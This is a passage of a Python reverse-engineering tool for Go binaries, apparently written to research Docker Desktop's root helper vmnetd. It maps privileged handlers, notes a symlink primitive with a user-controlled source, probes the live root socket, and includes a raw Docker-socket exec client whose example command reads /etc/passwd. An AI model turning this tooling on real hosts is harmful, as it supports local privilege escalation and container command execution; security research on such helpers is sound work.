    Filters for strings starting with '/' that look like filesystem paths.
    """
    strings = analyze_go_string_section(binary_path)
    return [(off, s) for off, s in strings if s.startswith('/') and len(s) >= 5]


# ---------------------------------------------------------------------------
# Go unix socket reference patterns
# ---------------------------------------------------------------------------

def go_unix_socket_patterns() -> dict:
    """
    Canonical Go unix domain socket patterns from Network Programming with Go
    and System Programming Essentials with Go.

    Key: Go's net package treats "unix" sockets identically to TCP sockets —
    same net.Conn interface, same bufio/io patterns. The only difference is
    the network string ("unix" vs "tcp") and that the address is a filesystem path.
    """
    return {
        "client_pattern": """
# Canonical Go unix socket client
conn, err := net.Dial("unix", "/var/run/foo.sock")
if err != nil { log.Fatal(err) }
defer conn.Close()
// Newline-framed read (vmnetd protocol.ReadString pattern):
r := bufio.NewReader(conn)
line, err := r.ReadString('\\n')
line = strings.TrimRight(line, "\\n")
// Exact-N-byte read:
buf := make([]byte, 47)
io.ReadFull(conn, buf)
""",
        "server_pattern": """
# Canonical Go unix socket server (goroutine-per-connection)
os.Remove(sockPath)  // clean up stale socket
ln, err := net.Listen("unix", sockPath)
if err != nil { log.Fatal(err) }
defer ln.Close()
for {
    conn, err := ln.Accept()
    if err != nil { continue }
    go handleConn(conn)
}
""",
        "binary_read_pattern": """
# binary.Read for typed reads (encoding/binary)
var val uint32
binary.Read(conn, binary.LittleEndian, &val)
// Varint decode:
n, bytesRead := binary.Uvarint(buf)
""",
        "vmnetd_newline_framing": """
# vmnetd protocol.ReadString wire format
# Server reads each field as: ReadString(conn, 1024)
# which calls bufio.Reader.ReadString('\\n') internally
# Wire: each field = value_bytes + b'\\n'
payload = b'\\n'.join(fields) + b'\\n'  # WRONG: use build_symlink_message()
payload = build_symlink_message(fields)  # CORRECT
""",
    }


# ---------------------------------------------------------------------------
# Docker socket HTTP-over-unix client
# ---------------------------------------------------------------------------

def docker_socket_exec(sock_path: str, container_id: str,
                        cmd: list, timeout: float = 10.0) -> dict:
    """
    Execute a command in a running Docker container via Docker daemon socket API.
    Speaks HTTP/1.1 over unix socket — no docker CLI required.

    Docker REST API sequence:
      1. POST /v1.41/containers/{id}/exec  → create exec instance, get exec_id
      2. POST /v1.41/exec/{exec_id}/start  → start exec, read stdout/stderr stream

    Args:
        sock_path: path to docker socket (e.g. /tmp/target_docker.sock)
        container_id: container ID or name
        cmd: command list, e.g. ["id"] or ["cat", "/etc/passwd"]
        timeout: socket timeout
    Returns:
        dict with exec_id, output, error
    """
    import socket as sock_mod
    import json

    def http_request(sock_path: str, method: str, path: str,
                     body: bytes = b"", timeout: float = 10.0) -> tuple:
        s = sock_mod.socket(sock_mod.AF_UNIX, sock_mod.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect(sock_path)
        content_type = b"application/json" if body else b""
        headers = (
            f"{method} {path} HTTP/1.1\r\n"
            f"Host: localhost\r\n"
            f"Content-Length: {len(body)}\r\n"
        )
        if content_type:
            headers += f"Content-Type: application/json\r\n"
        headers += "\r\n"
        s.sendall(headers.encode() + body)
        resp = b""
        try:
            while True:
                chunk = s.recv(65536)
                if not chunk:
                    break
                resp += chunk
        except Exception:
            pass
        s.close()
        # Split HTTP response: headers + body
        split = resp.find(b"\r\n\r\n")
        if split < 0:
            return resp, b""
        return resp[:split], resp[split+4:]

    result = {"exec_id": None, "output": b"", "error": None}

    try:
        # Step 1: create exec instance
        exec_body = json.dumps({
            "AttachStdout": True,
            "AttachStderr": True,
            "Cmd": cmd,
        }).encode()
        _, resp_body = http_request(
            sock_path, "POST",
            f"/v1.41/containers/{container_id}/exec",
            exec_body, timeout,
        )
        exec_resp = json.loads(resp_body)
        exec_id = exec_resp.get("Id", "")
        result["exec_id"] = exec_id

        # Step 2: start exec
        start_body = json.dumps({"Detach": False, "Tty": False}).encode()
        _, output = http_request(
            sock_path, "POST",
            f"/v1.41/exec/{exec_id}/start",
            start_body, timeout,
        )
        result["output"] = output
    except Exception as e:
        result["error"] = str(e)

    return result


def docker_list_containers(sock_path: str, timeout: float = 5.0) -> list:
    """List running containers via Docker socket HTTP API."""
    import socket as sock_mod
    import json

    s = sock_mod.socket(sock_mod.AF_UNIX, sock_mod.SOCK_STREAM)
    s.settimeout(timeout)
    s.connect(sock_path)
    req = b"GET /v1.41/containers/json HTTP/1.1\r\nHost: localhost\r\n\r\n"
    s.sendall(req)
    resp = b""
    try:
        while True:
            chunk = s.recv(65536)
            if not chunk:
                break
            resp += chunk
    except Exception:
        pass
    s.close()
    split = resp.find(b"\r\n\r\n")
    body = resp[split+4:] if split >= 0 else resp
    try:
        return json.loads(body)
    except Exception:
        return []


# ---------------------------------------------------------------------------
# Main analysis entry point
# ---------------------------------------------------------------------------

def analyze(binary_path: str, text_slide: int = TEXT_SLIDE_DEFAULT,
             disasm_handlers: bool = True,
             vmnetd_sock: str = "") -> AnalysisResult:
    """
    Full Go binary RE analysis.
    binary_path: path to the Mach-O or ELF binary
    text_slide: ASLR slide base (default 0x4000000 for macOS vmnetd)
    disasm_handlers: if True, disassemble each handler function
    vmnetd_sock: if set, probe the live socket for handler responses

    Returns AnalysisResult with all findings.
    """
    result = AnalysisResult(binary_path=binary_path)

    try:
        data = load_binary(binary_path)
    except Exception as e:
        result.errors.append(f"load: {e}")
        return result

    result.go_version = detect_go_version(data)

    # Parse sections
    try:
        if is_macho(data):
            result.arch = "x86_64"  # assume; parse cputype if needed
            sections = parse_macho_sections(data, text_slide)
            pclntab_key = '__gopclntab'
        elif is_elf(data):
            sections = parse_elf_sections(data)
            pclntab_key = '.gopclntab'
        else:
            result.errors.append("unknown binary format")
            return result
    except Exception as e:
        result.errors.append(f"section parse: {e}")
        return result

    # Parse pclntab
    pclntab_sec = sections.get(pclntab_key)
    if not pclntab_sec:
        result.errors.append(f"section {pclntab_key} not found")
        return result

    try:
        pclntab_data = data[pclntab_sec.fileoff: pclntab_sec.fileoff + pclntab_sec.size]
        magic = struct.unpack_from('<I', pclntab_data, 0)[0]
        result.pclntab_magic = magic
        funcs = parse_pclntab(data, pclntab_sec.fileoff, pclntab_sec.size, text_slide)
        result.functions = funcs
        result.num_functions = len(funcs)
    except Exception as e:
        result.errors.append(f"pclntab: {e}")
        return result

    # Handler mapping via mapassign_fast64 pattern
    if HAVE_CAPSTONE:
        try:
            handlers = find_mapassign_pattern(data, funcs, text_slide)
            result.handlers = handlers
        except Exception as e:
            result.errors.append(f"handler scan: {e}")

        # Supplement with rodata fptr scan
        try:
            rodata_fptrs = scan_rodata_fptrs(data, sections, funcs, text_slide)
        except Exception as e:
            rodata_fptrs = []
            result.errors.append(f"rodata: {e}")
    else:
        result.errors.append("capstone not installed — disassembly disabled")

    # Disassemble each handler and infer message frame format
    if disasm_handlers and HAVE_CAPSTONE:
        for h in result.handlers:
            try:
                frame_info = infer_message_frames(data, h.func_va, funcs, text_slide, result.arch)
                result.message_frames[h.func_name] = frame_info
            except Exception as e:
                result.message_frames[h.func_name] = {"error": str(e)}

    return result

# ---------------------------------------------------------------------------
# vmnetd-specific full analysis (hardcoded target paths)
# ---------------------------------------------------------------------------

VMNETD_BINARY = "/path/to/target/com.docker.vmnetd"
VMNETD_REMOTE_SOCK = "/var/run/com.docker.vmnetd.sock"

VMNETD_KNOWN_HANDLERS = {
    # Confirmed from commands.init disassembly (vmnetd Docker Desktop 4.x)
    # cmd_id: (handler_name, needs_payload)
    2:  ("handleUninstall",         False),
    4:  ("handleUninstallSymlinks", False),
    6:  ("handleBindIpv4",          True),   # binds IPv4 interface
    7:  ("handleInstallSymlinks",   True),   # 6 newline-framed string fields
    9:  ("handlePing",              False),  # returns b'\x00'
    10: ("handleEnsureLocalhost",   False),
    12: ("handleAddExtraHosts",     True),   # writes /etc/hosts as root
    13: ("handleDiagnose",          False),  # exec /usr/sbin/spindump -file /tmp/spindump.txt
}

# Hardcoded destination paths in doSymlink (go.string.* base fileoff=0x149be0, VA=0x4149be0)
VMNETD_SYMLINK_HARDCODED_DSTS = [
    "/var/run/docker.sock",            # 20 chars
    "/var/run/docker-cli.sock",        # 24 chars
    "/usr/local/lib/docker/cli-plugins", # 33 chars
    "/usr/local/bin/<binary>",         # via Sprintf with format string at fileoff 0x149be0+10169
]

# doSymlink(src, dst) behavior:
#   - calls os.Symlink(src, dst) as root
#   - src: user-controlled in binary install calls
#   - dst: hardcoded (see VMNETD_SYMLINK_HARDCODED_DSTS)
#   - symlinkBinary gate: os.Stat(src) must succeed before symlink creation
#   - shouldSymlink: always True for non-kubectl binaries

def analyze_vmnetd(live_probe: bool = False) -> dict:
    """
    Full analysis of com.docker.vmnetd with vmnetd-specific logic.
    Returns handler map + message frame analysis.
    """
    result = analyze(
        VMNETD_BINARY,
        text_slide=TEXT_SLIDE_DEFAULT,
        disasm_handlers=True,
    )

    # Apply known handler mapping from prior RE work if capstone didn't find them
    if not result.handlers:
        for cmd_id, (name, needs_payload) in VMNETD_KNOWN_HANDLERS.items():
            # Find the VA from pclntab
            matching = [f for f in result.functions if name in f.name]
            va = matching[0].va if matching else 0
            result.handlers.append(HandlerEntry(
                cmd_id=cmd_id,
                func_va=va,
                func_name=name,
                args_hint="payload_required" if needs_payload else "no_payload",
            ))

    output = {
        "binary": VMNETD_BINARY,
        "go_version": result.go_version,
        "num_functions": result.num_functions,
        "pclntab_magic": f"0x{result.pclntab_magic:08x}",
        "handlers": [
            {
                "cmd": h.cmd_id,
                "name": h.func_name,
                "va": f"0x{h.func_va:08x}",
                "args": h.args_hint,
            }
            for h in sorted(result.handlers, key=lambda x: x.cmd_id)
        ],
        "frame_analysis": result.message_frames,
        "errors": result.errors,
    }

    if live_probe:
        output["live_probes"] = {}
        for cmd_id in range(10):
            try:
                resp = vmnetd_send_cmd(VMNETD_REMOTE_SOCK, cmd_id, timeout=3.0)
                output["live_probes"][cmd_id] = resp.hex() if resp else "timeout/empty"
            except Exception as e:
                output["live_probes"][cmd_id] = f"error: {e}"

    return output

# ---------------------------------------------------------------------------
# Standalone execution for quick RE
# ---------------------------------------------------------------------------

if __name__ == "__main__":
    import json
    import sys

    target = sys.argv[1] if len(sys.argv) > 1 else VMNETD_BINARY
    live = "--live" in sys.argv

    if target == "vmnetd" or target == VMNETD_BINARY:
        result = analyze_vmnetd(live_probe=live)
    else:
        ar = analyze(target)
        result = {
            "binary": ar.binary_path,
            "go_version": ar.go_version,
            "num_functions": ar.num_functions,
            "pclntab_magic": f"0x{ar.pclntab_magic:08x}",
            "top_functions": [
                {"va": f"0x{f.va:x}", "name": f.name}
                for f in sorted(ar.functions, key=lambda x: x.va)[:50]
            ],
            "handlers": [
                {"cmd": h.cmd_id, "name": h.func_name, "va": f"0x{h.func_va:x}"}
                for h in ar.handlers
            ],
            "errors": ar.errors,
        }

    print(json.dumps(result, indent=2))
